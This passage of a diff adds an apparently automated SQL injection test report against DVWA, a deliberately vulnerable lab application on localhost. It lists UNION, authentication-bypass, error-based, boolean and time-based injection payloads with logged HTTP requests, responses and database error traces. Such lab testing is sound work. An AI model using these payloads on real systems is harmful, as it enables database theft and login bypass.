+    "response_time_ms": 45.508384704589844,
+    "screenshot_path": "",
+    "status": "not_vulnerable"
+  },
+  {
+    "test_id": "UNION_HIGH_1",
+    "security_level": "high",
+    "vector": "union_based_sqli",
+    "payload": "1' UNION SELECT 1,2--",
+    "expected_result": "Data extracted via UNION",
+    "actual_result": "No data extracted",
+    "response_time_ms": 33.098459243774414,
+    "screenshot_path": "",
+    "status": "not_vulnerable"
+  },
+  {
+    "test_id": "UNION_HIGH_2",
+    "security_level": "high",
+    "vector": "union_based_sqli",
+    "payload": "1' UNION SELECT database(),user()--",
+    "expected_result": "Data extracted via UNION",
+    "actual_result": "No data extracted",
+    "response_time_ms": 41.80502891540527,
+    "screenshot_path": "",
+    "status": "not_vulnerable"
+  },
+  {
+    "test_id": "UNION_HIGH_3",
+    "security_level": "high",
+    "vector": "union_based_sqli",
+    "payload": "1' UNION SELECT table_name,table_schema FROM information_schema.tables LIMIT 1--",
+    "expected_result": "Data extracted via UNION",
+    "actual_result": "No data extracted",
+    "response_time_ms": 42.50454902648926,
+    "screenshot_path": "",
+    "status": "not_vulnerable"
+  },
+  {
+    "test_id": "UNION_HIGH_4",
+    "security_level": "high",
+    "vector": "union_based_sqli",
+    "payload": "1' UNION SELECT user,password FROM users LIMIT 1--",
+    "expected_result": "Data extracted via UNION",
+    "actual_result": "No data extracted",
+    "response_time_ms": 41.89801216125488,
+    "screenshot_path": "",
+    "status": "not_vulnerable"
+  },
+  {
+    "test_id": "UNION_HIGH_5",
+    "security_level": "high",
+    "vector": "union_based_sqli",
+    "payload": "1' UNION SELECT user,password FROM dvwa.users LIMIT 1--",
+    "expected_result": "Data extracted via UNION",
+    "actual_result": "No data extracted",
+    "response_time_ms": 42.97161102294922,
+    "screenshot_path": "",
+    "status": "not_vulnerable"
+  },
+  {
+    "test_id": "AUTH_BYPASS_HIGH_1",
+    "security_level": "high",
+    "vector": "authentication_bypass",
+    "payload": "admin'--",
+    "expected_result": "Authentication bypass successful",
+    "actual_result": "Bypass failed",
+    "response_time_ms": 41.35274887084961,
+    "screenshot_path": "",
+    "status": "not_vulnerable"
+  },
+  {
+    "test_id": "AUTH_BYPASS_HIGH_2",
+    "security_level": "high",
+    "vector": "authentication_bypass",
+    "payload": "admin' #",
+    "expected_result": "Authentication bypass successful",
+    "actual_result": "Bypass failed",
+    "response_time_ms": 42.33264923095703,
+    "screenshot_path": "",
+    "status": "not_vulnerable"
+  },
+  {
+    "test_id": "AUTH_BYPASS_HIGH_3",
+    "security_level": "high",
+    "vector": "authentication_bypass",
+    "payload": "admin'/*",
+    "expected_result": "Authentication bypass successful",
+    "actual_result": "Bypass failed",
+    "response_time_ms": 42.91844367980957,
+    "screenshot_path": "",
+    "status": "not_vulnerable"
+  },
+  {
+    "test_id": "AUTH_BYPASS_HIGH_4",
+    "security_level": "high",
+    "vector": "authentication_bypass",
+    "payload": "' OR 1=1--",
+    "expected_result": "Authentication bypass successful",
+    "actual_result": "Bypass failed",
+    "response_time_ms": 42.504072189331055,
+    "screenshot_path": "",
+    "status": "not_vulnerable"
+  },
+  {
+    "test_id": "AUTH_BYPASS_HIGH_5",
+    "security_level": "high",
+    "vector": "authentication_bypass",
+    "payload": "' OR '1'='1",
+    "expected_result": "Authentication bypass successful",
+    "actual_result": "Bypass failed",
+    "response_time_ms": 40.418386459350586,
+    "screenshot_path": "",
+    "status": "not_vulnerable"
+  },
+  {
+    "test_id": "AUTH_BYPASS_HIGH_6",
+    "security_level": "high",
+    "vector": "authentication_bypass",
+    "payload": "' UNION SELECT 'admin','password'--",
+    "expected_result": "Authentication bypass successful",
+    "actual_result": "Bypass failed",
+    "response_time_ms": 43.265581130981445,
+    "screenshot_path": "",
+    "status": "not_vulnerable"
+  },
+  {
+    "test_id": "AUTH_BYPASS_HIGH_7",
+    "security_level": "high",
+    "vector": "authentication_bypass",
+    "payload": "admin' OR '1'='1",
+    "expected_result": "Authentication bypass successful",
+    "actual_result": "Bypass failed",
+    "response_time_ms": 41.98265075683594,
+    "screenshot_path": "",
+    "status": "not_vulnerable"
+  },
+  {
+    "test_id": "AUTH_BYPASS_HIGH_8",
+    "security_level": "high",
+    "vector": "authentication_bypass",
+    "payload": "' OR username='admin",
+    "expected_result": "Authentication bypass successful",
+    "actual_result": "Bypass failed",
+    "response_time_ms": 27.654409408569336,
+    "screenshot_path": "",
+    "status": "not_vulnerable"
+  }
+]</pre></div>
+    </section>
+    
+    <section id="requests">
+        <h2>HTTP Requests/Responses</h2>
+        <h3>Test ID: LOGIN</h3><p><b>Timestamp:</b> 2025-07-18T22:12:29.405068<br><b>URL:</b> http://localhost/dvwa/login.php<br><b>Method:</b> POST</p><h4>Request</h4><div class='code'>POST http://localhost/dvwa/login.php HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+
+{'username': 'admin', 'password': 'password', 'Login': 'Login', 'user_token': 'a523f5b80aa4e334934ca7fc0141a06d'}
+</div><h4>Response</h4><div class='code'>HTTP/1.1 200
+Date: Fri, 18 Jul 2025 15:12:29 GMT
+Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2
+X-Powered-By: PHP/8.1.2
+Expires: Tue, 23 Jun 2009 12:00:00 GMT
+Cache-Control: no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 6490
+Keep-Alive: timeout=5, max=98
+Connection: Keep-Alive
+Content-Type: text/html;charset=utf-8
+
+<!DOCTYPE html>
+
+<html lang="en-GB">
+
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+		<title>Welcome :: Damn Vulnerable Web Application (DVWA)</title>
+
+		<link rel="stylesheet" type="text/css" href="dvwa/css/main.css" />
+
+		<link rel="icon" type="\image/ico" href="favicon.ico" />
+
+		<script type="text/javascript" src="dvwa/js/dvwaPage.js"></script>
+
+	</head>
+
+	<body class="home light">
+		<div id="container">
+
+			<div id="header">
+
+				<img src="dvwa/images/logo.png" alt="Damn Vulnerable Web Application" />
+                <a href="#" onclick="javascript:toggleTheme();" class="theme-icon" title="Toggle theme between light and dark.">
+                    <img src="dvwa/images/theme-light-dark.png" alt="Damn Vulnerable Web Application" />
+                </a>
+			</div>
+
+			<div id="main_menu">
+
+				<div id="main_menu_padded">
+				<ul class="menuBlocks"><li class="selected"><a href=".">Home</a></li>
+<li class=""><a href="instructions.php">Instructions</a>...
+</div><hr><h3>Test ID: SET_SECURITY_LOW</h3><p><b>Timestamp:</b> 2025-07-18T22:12:29.488422<br><b>URL:</b> http://localhost/dvwa/security.php<br><b>Method:</b> POST</p><h4>Request</h4><div class='code'>POST http://localhost/dvwa/security.php HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+
+{'security': 'low', 'seclev_submit': 'Submit', 'user_token': '385b29c2cfc1383ebd39c067caa9c63b'}
+</div><h4>Response</h4><div class='code'>HTTP/1.1 200
+Date: Fri, 18 Jul 2025 15:12:29 GMT
+Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2
+X-Powered-By: PHP/8.1.2
+Expires: Tue, 23 Jun 2009 12:00:00 GMT
+Cache-Control: no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 5040
+Keep-Alive: timeout=5, max=95
+Connection: Keep-Alive
+Content-Type: text/html;charset=utf-8
+
+<!DOCTYPE html>
+
+<html lang="en-GB">
+
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+		<title>DVWA Security :: Damn Vulnerable Web Application (DVWA)</title>
+
+		<link rel="stylesheet" type="text/css" href="dvwa/css/main.css" />
+
+		<link rel="icon" type="\image/ico" href="favicon.ico" />
+
+		<script type="text/javascript" src="dvwa/js/dvwaPage.js"></script>
+
+	</head>
+
+	<body class="home light">
+		<div id="container">
+
+			<div id="header">
+
+				<img src="dvwa/images/logo.png" alt="Damn Vulnerable Web Application" />
+                <a href="#" onclick="javascript:toggleTheme();" class="theme-icon" title="Toggle theme between light and dark.">
+                    <img src="dvwa/images/theme-light-dark.png" alt="Damn Vulnerable Web Application" />
+                </a>
+			</div>
+
+			<div id="main_menu">
+
+				<div id="main_menu_padded">
+				<ul class="menuBlocks"><li class=""><a href=".">Home</a></li>
+<li class=""><a href="instructions.php">Instructions</a></...
+</div><hr><h3>Test ID: ERROR_LOW_1</h3><p><b>Timestamp:</b> 2025-07-18T22:12:29.589359<br><b>URL:</b> http://localhost/dvwa/vulnerabilities/sqli/<br><b>Method:</b> GET</p><h4>Request</h4><div class='code'>GET http://localhost/dvwa/vulnerabilities/sqli/?id=1' OR 1=1&Submit=Submit HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+</div><h4>Response</h4><div class='code'>HTTP/1.1 200
+Date: Fri, 18 Jul 2025 15:12:29 GMT
+Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2
+X-Powered-By: PHP/8.1.2
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 608
+Keep-Alive: timeout=5, max=94
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+<br />
+<b>Fatal error</b>:  Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''' at line 1 in C:\xampp\htdocs\DVWA\vulnerabilities\sqli\source\low.php:11
+Stack trace:
+#0 C:\xampp\htdocs\DVWA\vulnerabilities\sqli\source\low.php(11): mysqli_query(Object(mysqli), 'SELECT first_na...')
+#1 C:\xampp\htdocs\DVWA\vulnerabilities\sqli\index.php(34): require_once('C:\\xampp\\htdocs...')
+#2 {main}
+  thrown in <b>C:\xampp\htdocs\DVWA\vulnerabilities\sqli\source\low.php</b> on line <b>11</b><br />
+...
+</div><hr><h3>Test ID: ERROR_LOW_2</h3><p><b>Timestamp:</b> 2025-07-18T22:12:29.638540<br><b>URL:</b> http://localhost/dvwa/vulnerabilities/sqli/<br><b>Method:</b> GET</p><h4>Request</h4><div class='code'>GET http://localhost/dvwa/vulnerabilities/sqli/?id=1' AND 1=CONVERT(int, (SELECT @@version))--&Submit=Submit HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+</div><h4>Response</h4><div class='code'>HTTP/1.1 200
+Date: Fri, 18 Jul 2025 15:12:29 GMT
+Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2
+X-Powered-By: PHP/8.1.2
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 634
+Keep-Alive: timeout=5, max=93
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+<br />
+<b>Fatal error</b>:  Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'int, (SELECT @@version))--'' at line 1 in C:\xampp\htdocs\DVWA\vulnerabilities\sqli\source\low.php:11
+Stack trace:
+#0 C:\xampp\htdocs\DVWA\vulnerabilities\sqli\source\low.php(11): mysqli_query(Object(mysqli), 'SELECT first_na...')
+#1 C:\xampp\htdocs\DVWA\vulnerabilities\sqli\index.php(34): require_once('C:\\xampp\\htdocs...')
+#2 {main}
+  thrown in <b>C:\xampp\htdocs\DVWA\vulnerabilities\sqli\source\low.php</b> on line <b>11</b><br />
+...
+</div><hr><h3>Test ID: ERROR_LOW_3</h3><p><b>Timestamp:</b> 2025-07-18T22:12:29.687933<br><b>URL:</b> http://localhost/dvwa/vulnerabilities/sqli/<br><b>Method:</b> GET</p><h4>Request</h4><div class='code'>GET http://localhost/dvwa/vulnerabilities/sqli/?id=1' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS INT)--&Submit=Submit HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+</div><h4>Response</h4><div class='code'>HTTP/1.1 200
+Date: Fri, 18 Jul 2025 15:12:29 GMT
+Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2
+X-Powered-By: PHP/8.1.2
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 608
+Keep-Alive: timeout=5, max=92
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+<br />
+<b>Fatal error</b>:  Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''' at line 1 in C:\xampp\htdocs\DVWA\vulnerabilities\sqli\source\low.php:11
+Stack trace:
+#0 C:\xampp\htdocs\DVWA\vulnerabilities\sqli\source\low.php(11): mysqli_query(Object(mysqli), 'SELECT first_na...')
+#1 C:\xampp\htdocs\DVWA\vulnerabilities\sqli\index.php(34): require_once('C:\\xampp\\htdocs...')
+#2 {main}
+  thrown in <b>C:\xampp\htdocs\DVWA\vulnerabilities\sqli\source\low.php</b> on line <b>11</b><br />
+...
+</div><hr><h3>Test ID: ERROR_LOW_4</h3><p><b>Timestamp:</b> 2025-07-18T22:12:29.732107<br><b>URL:</b> http://localhost/dvwa/vulnerabilities/sqli/<br><b>Method:</b> GET</p><h4>Request</h4><div class='code'>GET http://localhost/dvwa/vulnerabilities/sqli/?id=' OR 1=1--&Submit=Submit HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+</div><h4>Response</h4><div class='code'>HTTP/1.1 200
+Date: Fri, 18 Jul 2025 15:12:29 GMT
+Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2
+X-Powered-By: PHP/8.1.2
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 608
+Keep-Alive: timeout=5, max=91
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+<br />
+<b>Fatal error</b>:  Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''' at line 1 in C:\xampp\htdocs\DVWA\vulnerabilities\sqli\source\low.php:11
+Stack trace:
+#0 C:\xampp\htdocs\DVWA\vulnerabilities\sqli\source\low.php(11): mysqli_query(Object(mysqli), 'SELECT first_na...')
+#1 C:\xampp\htdocs\DVWA\vulnerabilities\sqli\index.php(34): require_once('C:\\xampp\\htdocs...')
+#2 {main}
+  thrown in <b>C:\xampp\htdocs\DVWA\vulnerabilities\sqli\source\low.php</b> on line <b>11</b><br />
+...
+</div><hr><h3>Test ID: ERROR_LOW_5</h3><p><b>Timestamp:</b> 2025-07-18T22:12:29.786378<br><b>URL:</b> http://localhost/dvwa/vulnerabilities/sqli/<br><b>Method:</b> GET</p><h4>Request</h4><div class='code'>GET http://localhost/dvwa/vulnerabilities/sqli/?id=1' OR 'a'='a&Submit=Submit HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+</div><h4>Response</h4><div class='code'>HTTP/1.1 200
+Date: Fri, 18 Jul 2025 15:12:29 GMT
+Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2
+X-Powered-By: PHP/8.1.2
+Expires: Tue, 23 Jun 2009 12:00:00 GMT
+Cache-Control: no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 4906
+Keep-Alive: timeout=5, max=90
+Connection: Keep-Alive
+Content-Type: text/html;charset=utf-8
+
+<!DOCTYPE html>
+
+<html lang="en-GB">
+
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+		<title>Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA)</title>
+
+		<link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" />
+
+		<link rel="icon" type="\image/ico" href="../../favicon.ico" />
+
+		<script type="text/javascript" src="../../dvwa/js/dvwaPage.js"></script>
+
+	</head>
+
+	<body class="home light">
+		<div id="container">
+
+			<div id="header">
+
+				<img src="../../dvwa/images/logo.png" alt="Damn Vulnerable Web Application" />
+                <a href="#" onclick="javascript:toggleTheme();" class="theme-icon" title="Toggle theme between light and dark.">
+                    <img src="../../dvwa/images/theme-light-dark.png" alt="Damn Vulnerable Web Application" />
+                </a>
+			</div>
+
+			<div id="main_menu">
+
+				<div id="main_menu_padded">
+				<ul class="menuBlocks"><li class=""><a href="../../.">Home</a></li>
+<li cla...
+</div><hr><h3>Test ID: BOOL_TRUE_LOW_1</h3><p><b>Timestamp:</b> 2025-07-18T22:12:29.813822<br><b>URL:</b> http://localhost/dvwa/vulnerabilities/sqli/<br><b>Method:</b> GET</p><h4>Request</h4><div class='code'>GET http://localhost/dvwa/vulnerabilities/sqli/?id=1' AND 1=1--&Submit=Submit HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+</div><h4>Response</h4><div class='code'>HTTP/1.1 200
+Date: Fri, 18 Jul 2025 15:12:29 GMT
+Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2
+X-Powered-By: PHP/8.1.2
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 608
+Keep-Alive: timeout=5, max=89
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+<br />
+<b>Fatal error</b>:  Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''' at line 1 in C:\xampp\htdocs\DVWA\vulnerabilities\sqli\source\low.php:11
+Stack trace:
+#0 C:\xampp\htdocs\DVWA\vulnerabilities\sqli\source\low.php(11): mysqli_query(Object(mysqli), 'SELECT first_na...')
+#1 C:\xampp\htdocs\DVWA\vulnerabilities\sqli\index.php(34): require_once('C:\\xampp\\htdocs...')
+#2 {main}
+  thrown in <b>C:\xampp\htdocs\DVWA\vulnerabilities\sqli\source\low.php</b> on line <b>11</b><br />
+...
+</div><hr><h3>Test ID: BOOL_TRUE_LOW_2</h3><p><b>Timestamp:</b> 2025-07-18T22:12:29.862091<br><b>URL:</b> http://localhost/dvwa/vulnerabilities/sqli/<br><b>Method:</b> GET</p><h4>Request</h4><div class='code'>GET http://localhost/dvwa/vulnerabilities/sqli/?id=1' AND 'a'='a&Submit=Submit HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+</div><h4>Response</h4><div class='code'>HTTP/1.1 200
+Date: Fri, 18 Jul 2025 15:12:29 GMT
+Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2
+X-Powered-By: PHP/8.1.2
+Expires: Tue, 23 Jun 2009 12:00:00 GMT
+Cache-Control: no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 4630
+Keep-Alive: timeout=5, max=88
+Connection: Keep-Alive
+Content-Type: text/html;charset=utf-8
+
+<!DOCTYPE html>
+
+<html lang="en-GB">
+
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+		<title>Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA)</title>
+
+		<link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" />
+
+		<link rel="icon" type="\image/ico" href="../../favicon.ico" />
+
+		<script type="text/javascript" src="../../dvwa/js/dvwaPage.js"></script>
+
+	</head>
+
+	<body class="home light">
+		<div id="container">
+
+			<div id="header">
+
+				<img src="../../dvwa/images/logo.png" alt="Damn Vulnerable Web Application" />
+                <a href="#" onclick="javascript:toggleTheme();" class="theme-icon" title="Toggle theme between light and dark.">
+                    <img src="../../dvwa/images/theme-light-dark.png" alt="Damn Vulnerable Web Application" />
+                </a>
+			</div>
+
+			<div id="main_menu">
+
+				<div id="main_menu_padded">
+				<ul class="menuBlocks"><li class=""><a href="../../.">Home</a></li>
+<li cla...
+</div><hr><h3>Test ID: BOOL_TRUE_LOW_3</h3><p><b>Timestamp:</b> 2025-07-18T22:12:29.903994<br><b>URL:</b> http://localhost/dvwa/vulnerabilities/sqli/<br><b>Method:</b> GET</p><h4>Request</h4><div class='code'>GET http://localhost/dvwa/vulnerabilities/sqli/?id=1' OR 1=1--&Submit=Submit HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+</div><h4>Response</h4><div class='code'>HTTP/1.1 200
+Date: Fri, 18 Jul 2025 15:12:29 GMT
+Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2
+X-Powered-By: PHP/8.1.2
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 608
+Keep-Alive: timeout=5, max=87
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+<br />
+<b>Fatal error</b>:  Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''' at line 1 in C:\xampp\htdocs\DVWA\vulnerabilities\sqli\source\low.php:11
+Stack trace:
+#0 C:\xampp\htdocs\DVWA\vulnerabilities\sqli\source\low.php(11): mysqli_query(Object(mysqli), 'SELECT first_na...')
+#1 C:\xampp\htdocs\DVWA\vulnerabilities\sqli\index.php(34): require_once('C:\\xampp\\htdocs...')
+#2 {main}
+  thrown in <b>C:\xampp\htdocs\DVWA\vulnerabilities\sqli\source\low.php</b> on line <b>11</b><br />
+...
+</div><hr><h3>Test ID: BOOL_FALSE_LOW_1</h3><p><b>Timestamp:</b> 2025-07-18T22:12:29.949821<br><b>URL:</b> http://localhost/dvwa/vulnerabilities/sqli/<br><b>Method:</b> GET</p><h4>Request</h4><div class='code'>GET http://localhost/dvwa/vulnerabilities/sqli/?id=1' AND 1=2--&Submit=Submit HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+</div><h4>Response</h4><div class='code'>HTTP/1.1 200
+Date: Fri, 18 Jul 2025 15:12:29 GMT
+Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2
+X-Powered-By: PHP/8.1.2
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 608
+Keep-Alive: timeout=5, max=86
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+<br />
+<b>Fatal error</b>:  Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''' at line 1 in C:\xampp\htdocs\DVWA\vulnerabilities\sqli\source\low.php:11
+Stack trace:
+#0 C:\xampp\htdocs\DVWA\vulnerabilities\sqli\source\low.php(11): mysqli_query(Object(mysqli), 'SELECT first_na...')
+#1 C:\xampp\htdocs\DVWA\vulnerabilities\sqli\index.php(34): require_once('C:\\xampp\\htdocs...')
+#2 {main}
+  thrown in <b>C:\xampp\htdocs\DVWA\vulnerabilities\sqli\source\low.php</b> on line <b>11</b><br />
+...
+</div><hr><h3>Test ID: BOOL_FALSE_LOW_2</h3><p><b>Timestamp:</b> 2025-07-18T22:12:30.001064<br><b>URL:</b> http://localhost/dvwa/vulnerabilities/sqli/<br><b>Method:</b> GET</p><h4>Request</h4><div class='code'>GET http://localhost/dvwa/vulnerabilities/sqli/?id=1' AND 'a'='b&Submit=Submit HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+</div><h4>Response</h4><div class='code'>HTTP/1.1 200
+Date: Fri, 18 Jul 2025 15:12:29 GMT
+Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2
+X-Powered-By: PHP/8.1.2
+Expires: Tue, 23 Jun 2009 12:00:00 GMT
+Cache-Control: no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 4559
+Keep-Alive: timeout=5, max=85
+Connection: Keep-Alive
+Content-Type: text/html;charset=utf-8
+
+<!DOCTYPE html>
+
+<html lang="en-GB">
+
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+		<title>Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA)</title>
+
+		<link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" />
+
+		<link rel="icon" type="\image/ico" href="../../favicon.ico" />
+
+		<script type="text/javascript" src="../../dvwa/js/dvwaPage.js"></script>
+
+	</head>
+
+	<body class="home light">
+		<div id="container">
+
+			<div id="header">
+
+				<img src="../../dvwa/images/logo.png" alt="Damn Vulnerable Web Application" />
+                <a href="#" onclick="javascript:toggleTheme();" class="theme-icon" title="Toggle theme between light and dark.">
+                    <img src="../../dvwa/images/theme-light-dark.png" alt="Damn Vulnerable Web Application" />
+                </a>
+			</div>
+
+			<div id="main_menu">
+
+				<div id="main_menu_padded">
+				<ul class="menuBlocks"><li class=""><a href="../../.">Home</a></li>
+<li cla...
+</div><hr><h3>Test ID: BOOL_FALSE_LOW_3</h3><p><b>Timestamp:</b> 2025-07-18T22:12:30.043326<br><b>URL:</b> http://localhost/dvwa/vulnerabilities/sqli/<br><b>Method:</b> GET</p><h4>Request</h4><div class='code'>GET http://localhost/dvwa/vulnerabilities/sqli/?id=1' OR 1=2--&Submit=Submit HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+</div><h4>Response</h4><div class='code'>HTTP/1.1 200
+Date: Fri, 18 Jul 2025 15:12:30 GMT
+Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2
+X-Powered-By: PHP/8.1.2
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 608
+Keep-Alive: timeout=5, max=84
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+<br />
+<b>Fatal error</b>:  Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''' at line 1 in C:\xampp\htdocs\DVWA\vulnerabilities\sqli\source\low.php:11
+Stack trace:
+#0 C:\xampp\htdocs\DVWA\vulnerabilities\sqli\source\low.php(11): mysqli_query(Object(mysqli), 'SELECT first_na...')
+#1 C:\xampp\htdocs\DVWA\vulnerabilities\sqli\index.php(34): require_once('C:\\xampp\\htdocs...')
+#2 {main}
+  thrown in <b>C:\xampp\htdocs\DVWA\vulnerabilities\sqli\source\low.php</b> on line <b>11</b><br />
+...
+</div><hr><h3>Test ID: TIME_LOW_1</h3><p><b>Timestamp:</b> 2025-07-18T22:12:30.090402<br><b>URL:</b> http://localhost/dvwa/vulnerabilities/sqli/<br><b>Method:</b> GET</p><h4>Request</h4><div class='code'>GET http://localhost/dvwa/vulnerabilities/sqli/?id=1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--&Submit=Submit HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+</div><h4>Response</h4><div class='code'>HTTP/1.1 200
+Date: Fri, 18 Jul 2025 15:12:30 GMT
+Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2
+X-Powered-By: PHP/8.1.2
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 608
+Keep-Alive: timeout=5, max=83
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+<br />
+<b>Fatal error</b>:  Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''' at line 1 in C:\xampp\htdocs\DVWA\vulnerabilities\sqli\source\low.php:11
+Stack trace:
+#0 C:\xampp\htdocs\DVWA\vulnerabilities\sqli\source\low.php(11): mysqli_query(Object(mysqli), 'SELECT first_na...')
+#1 C:\xampp\htdocs\DVWA\vulnerabilities\sqli\index.php(34): require_once('C:\\xampp\\htdocs...')
+#2 {main}
+  thrown in <b>C:\xampp\htdocs\DVWA\vulnerabilities\sqli\source\low.php</b> on line <b>11</b><br />
+...
